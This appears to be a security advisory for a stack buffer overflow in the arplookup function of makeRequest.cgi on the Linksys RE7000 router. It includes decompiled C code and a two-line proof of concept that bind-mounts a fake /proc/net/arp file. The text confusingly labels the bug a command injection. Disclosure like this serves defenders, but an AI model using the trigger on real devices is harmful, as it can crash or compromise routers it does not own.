# Buffer Overflow Vulnerability in `/proc/net/arp`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Linksys RE7000 Router                                        |
| Firmware Version     | **FW_v2.0.15_211230_1012**                                   |
| Vulnerability Type   | **Stack-Based Buffer Overflow**                              |
| Vulnerable Component | `makeRequest.cgi` (function `arplookup`, buffers `v6` & `v7`) |
| Prerequisites        | Requires control over `/proc/net/arp` content or local filesystem write permissions (local exploitation only) |

2. Exploitation Path

```c
int __fastcall arplookup(const char *a1, char *a2)
{
  FILE *v4; // $s1
  int result; // $v0
  char v6[12]; // [sp+18h] [-124h] BYREF
  char v7[20]; // [sp+24h] [-118h] BYREF
  char v8[260]; // [sp+38h] [-104h] BYREF

  v4 = fopen("/proc/net/arp", "r");
  if ( v4 )
  {
    strcpy(a2, "00:00:00:00:00:00");
    while ( fgets(v8, 256, v4) )
    {
      sscanf(v8, "%16s %*s %*s %18s %*s %*s", v6, v7);
      ...
}
```

3. **Vulnerable Binaries:** `makeRequest.cgi`.
4. 0-Day Command Injection Exploitation Path: In the `makeRequest.cgi` file, at line 13, `fgets(v8, 256, v4)` reads data from `/proc/net/arp`. At line 15, `sscanf(v8, "%16s %*s %*s %18s %*s %*s", v6, v7)` parses the data. The buffer `v6` is only 12 bytes in size; if the IP field in the ARP table exceeds 11 characters (e.g., `"192.168.100.200"`, length 15), it results in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```bash
echo -e "192.168.100.200 0x1 0x2 00:11:22:33:44:55 0x0 0x0" > /tmp/fake_arp
mount --bind /tmp/fake_arp /proc/net/arp
```